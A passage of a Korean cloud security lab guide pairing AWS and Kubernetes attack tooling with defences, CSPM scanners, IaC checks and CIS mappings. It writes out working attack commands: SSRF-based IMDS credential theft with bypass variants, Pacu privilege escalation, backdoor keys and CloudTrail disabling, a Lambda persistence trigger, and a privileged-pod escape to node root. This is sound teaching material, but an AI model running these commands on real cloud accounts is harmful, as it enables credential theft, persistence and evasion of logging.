aws sts get-caller-identity
# {"UserId":"AROAJ...:i-xxxx", "Account":"123456789012", "Arn":"arn:aws:sts::123456789012:assumed-role/AdminRole/i-xxxx"}

aws s3 ls
aws iam list-users

# === IMDSv2 (방어) — 2-step 인증 ===
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/AdminRole

# === SSRF 결합 — 외부에서 IMDS 도달 ===
# 취약 앱: GET /fetch?url=<URL>
curl "http://victim.example/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/AdminRole"

# IMDS 우회 기법 — header injection / DNS rebinding / IPv6
curl "http://victim.example/fetch?url=http://[fd00:ec2::254]/latest/meta-data/"
curl "http://victim.example/fetch?url=http://instance-data/latest/meta-data/"   # AWS reserved DNS
curl "http://victim.example/fetch?url=http://2852039166/latest/meta-data/"      # decimal IP

# === 방어 (반드시 적용) ===
# 1. IMDSv2 강제 (HttpTokens=required)
aws ec2 modify-instance-metadata-options \
  --instance-id i-xxxx --http-tokens required --http-put-response-hop-limit 1
# hop-limit 1: container 내부에서 metadata 호출 차단

# 2. SSRF 방어 — outbound 차단 + URL allowlist
# nginx config:
# location /fetch { proxy_pass $arg_url; allow_methods GET; }
# 위는 위험 — 반드시 하드코딩 URL 사용

# 3. IAM role minimal — least privilege
# 4. GuardDuty 의 "UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration" alert
```

#### 도구 2: Pacu — AWS 권한 상승 자동화 (Step 4)

```bash
# Pacu 시작 + 세션 생성
pacu
> set_keys                       # access_key + secret 입력
> services                       # 사용 가능한 모듈 목록
> ls

# 1. 모든 IAM 자원 열거
> run iam__enum_users_roles_policies_groups
# Found: 23 users / 17 roles / 89 policies / 5 groups

# 2. 권한 상승 경로 스캔
> run iam__privesc_scan
# Found 3 escalation paths:
#   1. CreatePolicyVersion (User can attach new version)
#   2. SetExistingDefaultPolicyVersion
#   3. CreateAccessKey (User can create new key for another user)

# 3. 자동 권한 상승 시도
> run iam__privesc_scan --offline
# Method: CreateLoginProfile - User Bob can create login for User Alice
# Confirm to escalate? Y
# [Success] Created login profile for arn:aws:iam::123:user/Alice

# 4. 백도어 설치
> run iam__backdoor_users_keys --user-name Alice
# Created new access key: AKIA... for user Alice

# 5. CloudTrail 무력화
> run detection__disruption
# - StopLogging on trail "default"
# - Delete trail "secondary"
# - PutEventSelectors with empty selectors

# 6. Lambda persistence
> run lambda__backdoor_new_users
# Lambda 'CreateUserBackdoor' triggered on iam:CreateUser → 자동 admin 권한 부여

# === 수동 조사 (Pacu 없이) ===
# 자기 권한 시뮬레이션
aws iam simulate-principal-policy \
  --policy-source-arn arn:aws:iam::123:user/Bob \
  --action-names "iam:CreateUser" "iam:AttachUserPolicy" "iam:CreatePolicyVersion"

# 모든 정책의 statement 검토
aws iam list-policies --scope Local --query 'Policies[].Arn' --output text | \
  xargs -I{} aws iam get-policy-version \
    --policy-arn {} \
    --version-id v1 \
    --query 'PolicyVersion.Document.Statement[?Effect==`Allow` && contains(Resource, `*`)]'

# CloudSplaining — 정책 등급
cloudsplaining download --output policies.json
cloudsplaining scan --input-file policies.json
# 출력: 위험도별 분류, 각 정책의 risky action 명시
```

방어: **Access Analyzer** + **service control policies (SCP)** + **permissions boundary** 로 risky action 사전 차단. Pacu 의 모든 모듈은 GuardDuty 의 `Discovery:IAMUser/AnomalousBehavior` 에서 알림 발생.

#### 도구 3: ScoutSuite / Prowler — CSPM (Step 10)

```bash
# === ScoutSuite ===
scout aws --no-browser --report-name lab1
# 분석: ~5분
# 산출: scoutsuite-report/aws-lab1/index.html
# 800+ rule 평가, 카테고리별 dashboard

scout aws --services s3,iam,ec2 --report-name s3-iam-ec2

# 결과 카테고리
# - Critical / High / Medium / Low / Informational
# - S3 buckets without encryption
# - IAM users without MFA
# - Security groups with 0.0.0.0/0
# - Unused security groups
# - CloudTrail not encrypted

# === Prowler ===
prowler aws --output-formats html,json
prowler aws -c check11 check12 check13           # 특정 check
prowler aws --compliance soc2_type1              # SOC 2 매핑
prowler aws --compliance cis_2.0_aws             # CIS Benchmark
prowler aws --compliance pci_3.2.1_aws           # PCI DSS
prowler aws --compliance hipaa                   # HIPAA

# 결과
# Total findings: 234 (PASS: 180 / FAIL: 54)
# Critical: 3 / High: 12 / Medium: 28 / Low: 11

# Slack/email integration
prowler aws --slack
prowler aws --send-sh                            # AWS Security Hub 로 직접 송출

# === Steampipe — SQL 직접 ===
steampipe query

# 1. Public S3 buckets
> select name, arn, region from aws_s3_bucket
  where (block_public_acls is null or block_public_acls = false)
    or (block_public_policy is null or block_public_policy = false);

# 2. IAM users without MFA
> select name, mfa_enabled from aws_iam_user where mfa_enabled = false;

# 3. EC2 with public IP and no security group restriction
> select i.instance_id, i.public_ip_address, sg.group_name
  from aws_ec2_instance as i
  cross join jsonb_array_elements(i.security_groups) as sg_ref
  join aws_vpc_security_group as sg on sg.group_id = sg_ref->>'GroupId'
  where i.public_ip_address is not null;

# 4. CloudTrail multi-region 미설정
> select name, is_multi_region_trail from aws_cloudtrail_trail
  where is_multi_region_trail = false;
```

CSPM 도구 비교: **ScoutSuite** (1회 스캔 + 보고서), **Prowler** (compliance framework 매핑 강력), **Steampipe** (SQL 임시 query 강력), **Cloudsploit** (멀티 클라우드 + JS).

#### 도구 4: kube-hunter / Peirates — Kubernetes 공격 (Step 7)

```bash
# === kube-hunter — 외부 스캐너 ===
kube-hunter --remote 192.168.1.100
# Discovered services:
#   API Server (10250) - Anonymous access enabled
#   Dashboard (8080) - No auth
#   etcd (2379) - Public, no TLS
# Vulnerabilities:
#   CVE-2018-1002105 (etcd path traversal) - HIGH
#   Insecure Kubelet API (10250) - CRITICAL

# 모든 노드 스캔
kube-hunter --pod                    # Pod 안에서 실행 → 내부 네트워크 스캔
kube-hunter --interface              # 모든 NIC 스캔
kube-hunter --cidr 10.0.0.0/16

# === Peirates — 권한 상승 ===
# 침투한 Pod 안에서
./peirates
# Menu:
#   1) Get cluster info
#   2) List service account tokens
#   3) Mount /host filesystem
#   4) Run kubectl as another SA
#   5) Pull secrets from etcd
#   6) Escape to node via privileged pod

# Service Account 토큰 추출
cat /var/run/secrets/kubernetes.io/serviceaccount/token
kubectl --token=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) auth can-i --list

# Pod escape — privileged container 시 노드 접근
kubectl run escape --rm -it --image=ubuntu --privileged --overrides='{"spec":{"hostPID":true,"hostNetwork":true,"containers":[{"name":"escape","image":"ubuntu","stdin":true,"tty":true,"securityContext":{"privileged":true},"volumeMounts":[{"name":"host","mountPath":"/host"}]}],"volumes":[{"name":"host","hostPath":{"path":"/"}}]}}'
# 안에서: chroot /host bash → 노드 root

# etcd 직접 접근 (보안 안 된 클러스터)
ETCDCTL_API=3 etcdctl --endpoints=https://10.0.0.1:2379 \
  --cacert=ca.crt --cert=client.crt --key=client.key \
  get / --prefix --keys-only | head

# === kube-bench — CIS 준수 평가 ===
docker run --rm --pid=host -v /etc:/etc:ro -v /var:/var:ro \
  aquasec/kube-bench:latest run --targets master,node
# [INFO] 1 Master Node Security Configuration
# [PASS] 1.1.1 Ensure that the API server pod specification file permissions are set to 644
# [FAIL] 1.2.16 Ensure that the admission control plugin PodSecurityPolicy is set
# [WARN] 1.4.1 Ensure that the controller manager pod specification file permissions

# === krane — RBAC 정적 분석 ===
krane report --kubeconfig ~/.kube/config
# 위험한 권한 grant 자동 탐지:
# - cluster-admin to ServiceAccount
# - secrets read in default namespace
# - exec in any pod

# === 방어 ===
# Pod Security Standards
kubectl label namespace prod pod-security.kubernetes.io/enforce=restricted

# OPA Gatekeeper / Kyverno — admission control
kubectl apply -f https://raw.githubusercontent.com/open-policy-agent/gatekeeper/master/deploy/gatekeeper.yaml

# NetworkPolicy — Pod 간 통신 제한
kubectl apply -f - << 'YML'
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata: { name: default-deny }
spec:
  podSelector: {}
  policyTypes: [Ingress, Egress]
YML
```

K8s 의 핵심 통제: **Pod Security Standards** (privileged 차단) + **NetworkPolicy** + **OPA Gatekeeper / Kyverno** + **Falco** (runtime).

#### 도구 5: Checkov / tfsec — Terraform 보안 (Step 13)

```bash
# === Checkov — 1000+ check, 모든 IaC ===
checkov -d ./terraform/
# Check: CKV_AWS_19: "Ensure all data stored in the S3 bucket is securely encrypted at rest"
#   FAILED for resource: aws_s3_bucket.data
#   File: /terraform/main.tf:12-25
#   Guide: https://docs.bridgecrew.io/docs/s3_14-data-encrypted-at-rest

checkov -d ./terraform/ --output sarif > checkov.sarif         # GitHub Code Scanning
checkov -d ./terraform/ --output junitxml > junit.xml          # CI 통합
checkov -d ./terraform/ --skip-check CKV_AWS_50,CKV_AWS_18

# 사용자 정의 룰 (custom)
cat > .checkov.yaml << 'YML'
framework:
  - terraform
  - kubernetes
skip-check:
  - CKV_AWS_18
  - CKV_K8S_14
hard-fail-on:
  - CRITICAL
  - HIGH
YML

# === tfsec — Terraform 전용, 빠름 ===
tfsec ./terraform/
# Result #1 CRITICAL Bucket has acl set to public-read.
#   ./main.tf:5
#   3       resource "aws_s3_bucket" "data" {
#   4         bucket = "my-data"
#   5         acl    = "public-read"
#   6       }

tfsec ./terraform/ --format json > tfsec.json
tfsec ./terraform/ --no-color --no-banner --concise-output

# 신규 룰 (Bridgecrew → Aqua)
tfsec --config-file tfsec.yml ./terraform/

# === terrascan — OPA 기반 ===
terrascan scan -d ./terraform/ -t aws -o json
terrascan scan -d ./terraform/ -t aws --policy-type all

# === KICS — Checkmarx (멀티 IaC, 가장 광범위) ===
docker run -v $(pwd):/path checkmarx/kics:latest scan -p "/path" -o "/path/results"

# === pre-commit / CI 통합 ===
cat > .pre-commit-config.yaml << 'YML'
repos:
- repo: https://github.com/bridgecrewio/checkov
  rev: 3.0.0
  hooks: [{id: checkov, args: [--quiet, --compact]}]
- repo: https://github.com/aquasecurity/tfsec
  rev: v1.28.0
  hooks: [{id: tfsec}]
YML
pre-commit install

# === HashiCorp Sentinel (Terraform Cloud) ===
cat > deny-public-bucket.sentinel << 'SEN'
import "tfplan/v2" as tfplan
public_buckets = filter tfplan.resource_changes as _, rc {
  rc.type is "aws_s3_bucket_public_access_block" and
  rc.change.after.block_public_acls is false
}
main = rule { length(public_buckets) is 0 }
SEN

# === GitOps — Argo CD + Argo CD-Vault-Plugin ===
# 모든 manifest 가 git 에 있어야 함, 직접 kubectl apply 금지
# argocd app create --sync-policy automated --repo https://...
```

IaC 보안의 흐름: **PR 단계 (checkov pre-commit)** → **CI gate (tfsec/terrascan/kics)** → **TF plan 정책 (Sentinel/OPA)** → **deploy 후 drift 탐지 (driftctl)**. 4 단계 중 한 단계라도 빠지면 misconfiguration 이 운영에 도달.

#### 도구 6: CloudTrail / Sigma — 로그 분석 (Step 11)

```bash
# === CloudTrail 직접 query ===
# Athena 로 CloudTrail 분석
aws athena start-query-execution --query-string \
  "SELECT eventName, sourceIPAddress, userIdentity.principalId, COUNT(*) AS cnt
   FROM cloudtrail_logs
   WHERE eventTime > '2026-05-01'
     AND errorCode = 'AccessDenied'
   GROUP BY eventName, sourceIPAddress, userIdentity.principalId
   ORDER BY cnt DESC
   LIMIT 50;" \
  --result-configuration OutputLocation=s3://my-athena-results/

# AccessDenied 폭증 → recon (Pacu enum) 시그니처

# === Sigma — generic detection ===
ls /tmp/sigma/rules/cloud/aws/ | head
# aws_console_login_no_mfa.yml
# aws_iam_backdoor_users_keys.yml
# aws_imds_credential_theft.yml
# aws_root_account_usage.yml
# aws_cloudtrail_disable_logging.yml

# Sigma → Splunk SPL 변환
sigma2splunk /tmp/sigma/rules/cloud/aws/aws_imds_credential_theft.yml

# Sigma → ElasticSearch DSL
sigma2es /tmp/sigma/rules/cloud/aws/aws_root_account_usage.yml

# === EventBridge alert ===
aws events put-rule --name "RootAccountUsage" \
  --event-pattern '{"source":["aws.signin"],"detail":{"userIdentity":{"type":["Root"]}}}'

aws events put-targets --rule "RootAccountUsage" \
  --targets "Id=1,Arn=arn:aws:sns:us-east-1:123:security-alerts"

# === GuardDuty 시뮬레이션 ===
# Stratus Red Team 으로 GuardDuty 알림 트리거
stratus warmup aws.credential-access.ec2-get-password-data
stratus detonate aws.credential-access.ec2-get-password-data
# GuardDuty 알림: Recon:IAMUser/MaliciousIPCaller.Custom

# 다른 시나리오
stratus list --platform aws
stratus detonate aws.persistence.iam-create-admin-user
stratus detonate aws.exfiltration.s3-backdoor-bucket-policy
stratus detonate aws.discovery.ec2-enumerate-from-instance
```

CloudTrail + EventBridge + GuardDuty + Security Hub 4 단계: 로그 → 패턴 → ML 탐지 → 통합 대시보드. Sigma 룰은 venda agnostic 하므로 Splunk/Elastic/Sumo 어디서든 동일한 detection.

#### 도구 7: Stratus Red Team — 클라우드 공격 시뮬레이션 (Step 12)

```bash
# DataDog 의 클라우드 attack emulation tool
stratus list --platform aws
# aws.credential-access.ec2-get-password-data
# aws.credential-access.ec2-steal-instance-credentials
# aws.credential-access.secretsmanager-batch-retrieve-secrets
# aws.defense-evasion.cloudtrail-delete
# aws.defense-evasion.cloudtrail-disable-logging
# aws.defense-evasion.cloudtrail-event-selectors
# aws.defense-evasion.organizations-leave
# aws.defense-evasion.vpc-remove-flow-logs
# aws.discovery.ec2-enumerate-from-instance
# aws.exfiltration.ec2-share-ami
# aws.exfiltration.ec2-share-ebs-snapshot
# aws.exfiltration.rds-share-snapshot
# aws.exfiltration.s3-backdoor-bucket-policy
# aws.impact.s3-ransomware-batch-deletion
# aws.impact.s3-ransomware-client-side-encryption
# aws.impact.s3-ransomware-individual-deletion
# aws.initial-access.console-login-without-mfa
# aws.lateral-movement.ec2-instance-connect
# aws.lateral-movement.ec2-serial-console
# aws.persistence.iam-backdoor-role
# aws.persistence.iam-backdoor-user
# aws.persistence.iam-create-admin-user
# aws.persistence.iam-create-user-login-profile
# aws.persistence.lambda-backdoor-function
# aws.persistence.lambda-layer-extension
# aws.persistence.rolesanywhere-create-trust-anchor
# aws.persistence.sts-federation-token

# 실제 시뮬레이션
stratus warmup aws.persistence.iam-backdoor-user
stratus detonate aws.persistence.iam-backdoor-user
# Output: Created backdoor user "stratus-red-team-1234"
# GuardDuty 알림: Persistence:IAMUser/AnomalousBehavior

stratus cleanup aws.persistence.iam-backdoor-user
# 모든 자원 자동 정리

# Detection 검증 — 알림 확인
aws guardduty list-findings --detector-id $DETECTOR_ID \
  --finding-criteria '{"Criterion":{"updatedAt":{"GreaterThan":1746201600000}}}'

# Atomic Red Team (cloud) — MITRE ATT&CK 매핑
git clone https://github.com/redcanaryco/atomic-red-team /tmp/atomic
ls /tmp/atomic/atomics/T1078.004    # Cloud Account
```

Stratus 의 30+ 시나리오로 detection 룰의 실 효과를 정량 측정. **detection coverage** = 시도된 테크닉 / GuardDuty 가 알림 발생시킨 테크닉.

### 점검 / 공격 / 방어 흐름 (15 step + multi_task 통합)

#### Phase A — 클라우드 자산 inventory (정찰, s1·s8·s10)

```bash
# 1. 모든 자원 inventory (read-only)
aws sts get-caller-identity
aws iam get-account-summary
aws ec2 describe-regions --query 'Regions[].RegionName' | jq -r '.[]' > /tmp/regions.txt

# region 별 자원 수
for r in $(cat /tmp/regions.txt); do
  ec2=$(aws ec2 describe-instances --region $r --query 'length(Reservations[].Instances[])')
  s3=$(aws s3 ls --region $r 2>/dev/null | wc -l)
  echo "$r: EC2=$ec2 S3buckets=$s3"
done

# 2. CSPM 종합 스캔
prowler aws --output-formats html,csv -F /tmp/prowler-baseline
scout aws --no-browser --report-name baseline

# 3. Steampipe 임시 dashboard
steampipe query "select count(*) as total, region from aws_ec2_instance group by region"
steampipe query "select arn, public_access_block_configuration from aws_s3_bucket where public_access_block_configuration is null"

# 4. 자격증명 노출 검사 (모든 git repo + S3)
trufflehog github --org=myorg --token=$GH_TOKEN --only-verified --json > /tmp/leaks.json
gitleaks dir /path/to/repos --report-format json --report-path /tmp/gitleaks.json
cloud_enum -k mycompany --quickscan

# 5. IAM 정책 위험도
cloudsplaining download --output ./policies
cloudsplaining scan --input-file ./policies --output /tmp/cs-report.html

# baseline 산출
cat > /tmp/cloud-baseline.txt << EOF
=== Cloud Baseline ($(date +%F)) ===
Regions:        $(wc -l < /tmp/regions.txt)
Total EC2:      $(steampipe query --output csv "select count(*) from aws_ec2_instance" | tail -1)
Public S3:      $(steampipe query --output csv "select count(*) from aws_s3_bucket where (block_public_acls is null or block_public_acls = false)" | tail -1)
IAM no MFA:     $(steampipe query --output csv "select count(*) from aws_iam_user where mfa_enabled = false" | tail -1)
Prowler issues: $(grep -c FAIL /tmp/prowler-baseline*)
Verified leaks: $(jq '. | length' /tmp/leaks.json)
EOF
```

#### Phase B — 공격자 침투 (s2·s4·s5·s7·s9)

```bash
# 1. SSRF → IMDS (격리 시뮬)
TOKEN=$(curl -s -X PUT "http://localhost:4566/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://localhost:4566/latest/meta-data/iam/security-credentials/

# 2. 자격증명 사용 (LocalStack)
aws --endpoint-url=http://localhost:4566 sts get-caller-identity

# 3. Pacu 권한 상승 (CloudGoat 환경)
pacu
> set_keys
> run iam__enum_users_roles_policies_groups
> run iam__privesc_scan
> run iam__backdoor_users_keys --user-name target

# 4. Cross-account assumption
aws sts assume-role \
  --role-arn arn:aws:iam::987:role/AdminRole \
  --role-session-name attacker \
  --external-id (if needed)

# 5. K8s pod escape (kind 클러스터)
kubectl run escape --rm -it --image=ubuntu --privileged \
  --overrides='{"spec":{"hostPID":true,"containers":[{"name":"x","image":"ubuntu","stdin":true,"tty":true,"securityContext":{"privileged":true},"volumeMounts":[{"name":"h","mountPath":"/h"}]}],"volumes":[{"name":"h","hostPath":{"path":"/"}}]}}'

# 6. 지속성 — Lambda backdoor
aws lambda create-function --function-name maintain \
  --runtime python3.11 --role arn:aws:iam::123:role/LambdaRole \
  --handler index.handler --zip-file fileb://backdoor.zip

aws events put-rule --name "PersistTrigger" \
  --event-pattern '{"source":["aws.iam"],"detail-type":["AWS API Call via CloudTrail"],"detail":{"eventName":["CreateUser"]}}'

aws events put-targets --rule PersistTrigger \
  --targets "Id=1,Arn=arn:aws:lambda:us-east-1:123:function:maintain"
```

#### Phase C — 방어자 통제 (s10·s11·s12·s13·s14)

```bash
# 1. CSPM 일일 자동 스캔 → S3 + Slack
prowler aws --output-formats json -F daily
aws s3 cp daily.json s3://security-reports/$(date +%F)/

# 2. CloudTrail multi-region + log file validation + KMS
aws cloudtrail update-trail --name default \
  --is-multi-region-trail --enable-log-file-validation \
  --kms-key-id arn:aws:kms:us-east-1:123:key/abc

# 3. GuardDuty + Security Hub 활성화
aws guardduty create-detector --enable
aws securityhub enable-security-hub --enable-default-standards
aws macie2 enable-macie

# 4. EventBridge 알림 룰 (Sigma 변환)
aws events put-rule --name "RootUsage" \
  --event-pattern '{"source":["aws.signin"],"detail":{"userIdentity":{"type":["Root"]}}}'
aws events put-rule --name "CloudTrailDisable" \
  --event-pattern '{"source":["aws.cloudtrail"],"detail":{"eventName":["StopLogging","DeleteTrail"]}}'

# 5. SCP — root account / region restriction
aws organizations create-policy \
  --content '{"Version":"2012-10-17","Statement":[{"Effect":"Deny","Action":"*","Resource":"*","Condition":{"StringEquals":{"aws:PrincipalType":"Account"}}}]}' \
  --description "Deny root usage" \
  --type SERVICE_CONTROL_POLICY \
  --name DenyRoot

# 6. Access Analyzer — external access
aws accessanalyzer create-analyzer --analyzer-name org --type ORGANIZATION

# 7. IaC PR gate
# .github/workflows/iac.yml 에 checkov + tfsec 추가, FAIL 시 PR 차단

# 8. Stratus 로 detection 검증
stratus warmup aws.persistence.iam-backdoor-user
stratus detonate aws.persistence.iam-backdoor-user
sleep 300
aws guardduty list-findings --detector-id $DETECTOR --finding-criteria '...'
# detection latency 측정
```

#### Phase D — 통합 시나리오 (s99 multi_task)

s1 → s2 → s3 → s4 → s5 를 Bastion 에이전트가 한 번에:

1. **plan**: surface mapping → IMDS PoC → S3 enum → IAM privesc → cross-account
2. **execute**: aws CLI / curl / Pacu / sts assume-role
3. **synthesize**: ATT&CK 매핑 (T1078.004 / T1552.005 / T1530 / T1098.003 / T1199) + 5 단계 통제

### 도구 비교표 — 클라우드 공격 vs 통제

| 카테고리 | Red 도구 | Red 한계 | Blue 도구 | Blue 우위 조건 |
|---------|---------|---------|-----------|----------------|
| **IMDS 탈취** | curl + SSRF | IMDSv2 + hop-limit 1 | IMDSv2 강제 + GuardDuty | required tokens |
| **S3 enum** | s3scanner, cloud_enum | Block Public Access | BPA + Access Analyzer | account-level 차단 |
| **IAM privesc** | Pacu, CloudSplaining | Boundary policy + SCP | Access Analyzer + CloudTrail | least privilege |
| **Cross-account** | sts assume-role | external-id, condition | SCP + permissions boundary | conditional trust |
| **Lambda 침해** | code injection, env exfil | runtime monitoring + isolation | Lambda IAM + Macie | per-function role |
| **K8s 침해** | kube-hunter, Peirates | PodSecurityStandards + OPA | OPA Gatekeeper + Falco | admission control |
| **자격증명 leak** | trufflehog (red) | Secrets Manager + rotation | secret manager + IMDSv2 | no plain-text creds |
| **지속성** | Pacu backdoor + Lambda trigger | CloudTrail alert + Access Analyzer | EventBridge alert + log review | immediate detection |
| **CSPM 누락** | scoutsuite (red) | daily scan + Security Hub | Prowler + Steampipe + ScoutSuite | continuous monitoring |
| **IaC misconfig** | terraform 임의 수정 | PR gate + Sentinel | checkov + tfsec + Sentinel | pre-deploy block |

### 도구 선택 매트릭스 — 시나리오별 권장

| 시나리오 | 우선 도구 | 이유 |
|---------|---------|------|
| "AWS 첫 audit" | Prowler + ScoutSuite + Steampipe | 800+ rule baseline 즉시 |
| "K8s 환경 평가" | kube-bench + krane + kube-hunter | CIS + RBAC + 외부 스캔 3단계 |
| "IaC 보안 통합" | checkov + tfsec PR gate + Sentinel | 4 단계 차단 |
| "incident — 의심 IAM" | Pacu privesc_scan (red 시각) + CloudSplaining | 위험 정책 즉시 식별 |
| "compliance (SOC2/PCI/HIPAA)" | Prowler --compliance + Security Hub | 매핑된 보고서 자동 |
| "detection 검증" | Stratus Red Team | 30+ 시나리오 + GuardDuty 측정 |
| "신규 서비스 배포" | Sentinel/OPA + IAM Access Analyzer + canary | 사전 차단 + 단계적 |
| "멀티 클라우드" | CloudSploit + Steampipe + Defender for Cloud | AWS+Azure+GCP 통합 |

### 클라우드 보안 평가 보고서 (s15 산출물)

학생이 s15 에서 `/tmp/cloud_security_report.txt` 에 작성하는 30+ 항목을 NIST/CIS 매핑과 함께:

| 카테고리 | 항목 | 도구 / 기준 | 표준 |
|---------|------|------------|------|
| Identity | Root account MFA | aws iam get-account-summary | CIS 1.5 |
| Identity | 모든 user MFA | Steampipe query | CIS 1.10 |
| Identity | password policy 강력 | aws iam get-account-password-policy | CIS 1.9 |
| Identity | unused credentials 90일 | iam credential-report | CIS 1.12 |
| Logging | CloudTrail multi-region | aws cloudtrail describe-trails | CIS 3.1 |
| Logging | log file validation | --enable-log-file-validation | CIS 3.2 |
| Logging | KMS encryption | --kms-key-id | CIS 3.7 |
| Logging | VPC Flow Logs 활성 | ec2 describe-flow-logs | CIS 3.9 |
| Storage | S3 BPA account-level | s3control get-public-access-block | CIS 2.1.5 |
| Storage | S3 default encryption | s3 get-bucket-encryption | CIS 2.1.1 |
| Storage | EBS encryption by default | ec2 get-ebs-encryption-by-default | CIS 2.2.1 |
| Network | SG 0.0.0.0/0 SSH 차단 | Steampipe query | CIS 5.2 |
| Network | SG 0.0.0.0/0 RDP 차단 | Steampipe query | CIS 5.3 |
| Network | default SG no rules | ec2 describe-security-groups | CIS 5.4 |
| Detection | GuardDuty enabled | guardduty get-detector | CIS 4.16 |
| Detection | Security Hub | securityhub describe-hub | NIST RA-5 |
| Detection | Access Analyzer | accessanalyzer list-analyzers | NIST AC-6 |
| K8s | Pod Security Standards | namespace label | CIS K8s 5.7 |
| K8s | NetworkPolicy default-deny | kubectl get networkpolicy | CIS K8s 5.3 |
| IaC | checkov in CI | .github/workflows | NIST SSDF |

### 학생 셀프 체크리스트 (각 step 완료 기준)

- [ ] s1: aws cli 설치 + sts get-caller-identity + ATT&CK Cloud Matrix 매핑 5개 이상
- [ ] s2: IMDSv1 vs IMDSv2 두 명령 모두 실행, hop-limit 1 방어 설명, SSRF 결합 PoC
- [ ] s3: s3scanner 또는 aws s3 ls + Block Public Access 4 옵션 모두 명시
- [ ] s4: Pacu privesc_scan 또는 CloudSplaining 실행, 권한 상승 경로 3개 이상 식별
- [ ] s5: sts assume-role + external-id condition + SCP 방어 3가지
- [ ] s6: Lambda 환경변수 / runtime / IAM 분리 + dependency 위험 3가지
- [ ] s7: kube-hunter 결과 + Peirates 또는 escape PoC + PSS/OPA 방어 3가지
- [ ] s8: trufflehog/gitleaks/cloud_enum 3 도구 + secret manager 회전 정책
- [ ] s9: Pacu backdoor / Lambda trigger / IAM key 3 지속성 + EventBridge 탐지
- [ ] s10: ScoutSuite + Prowler + Steampipe 중 2개 이상, 결과 카테고리 분석
- [ ] s11: CloudTrail Athena query 작성 + Sigma 룰 1개 이상 적용
- [ ] s12: GuardDuty + Inspector + Macie + Security Hub 4 도구 비교표
- [ ] s13: checkov + tfsec 두 도구 모두 실행, FAIL 결과 수정 PR
- [ ] s14: Zero Trust 의 5 원칙 + AWS Verified Access 또는 ABAC 적용 예시
- [ ] s15: `/tmp/cloud_security_report.txt` 5 카테고리 × 4+ 항목 + CIS Benchmark 매핑
- [ ] s99: Bastion 가 5 작업을 plan→execute→synthesize, 5 ATT&CK Cloud + 단계별 통제

### 추가 참조 자료

- **CIS AWS Foundations Benchmark v2.0** https://www.cisecurity.org/benchmark/amazon_web_services
- **CIS Kubernetes Benchmark v1.8**
- **NIST SP 800-204** Security Strategies for Microservices-based Apps
- **NIST SP 800-207** Zero Trust Architecture
- **AWS Well-Architected Security Pillar**
- **MITRE ATT&CK Cloud Matrix** https://attack.mitre.org/matrices/enterprise/cloud/
- **OWASP Cloud-Native Application Security Top 10**
- **CSA Cloud Controls Matrix v4** (Cloud Security Alliance)
- **HashiCorp Sentinel** https://www.hashicorp.com/sentinel
- **Open Policy Agent (OPA)** https://www.openpolicyagent.org/
- **Stratus Red Team** https://stratus-red-team.cloud/

위 모든 Red 실습은 **격리 환경 (LocalStack / CloudGoat / kind)** 에서만 수행한다. 실 운영
계정에서 Pacu / Stratus / kube-hunter 를 돌리면 (a) 의도치 않은 자원 생성으로 비용 폭증
(b) GuardDuty 가 침해로 분류 → 보안 팀 인시던트 (c) AUP 위반으로 계정 정지 — 셋 다 발생
가능. 사전에 격리 환경임을 100% 확인하고 진행한다.
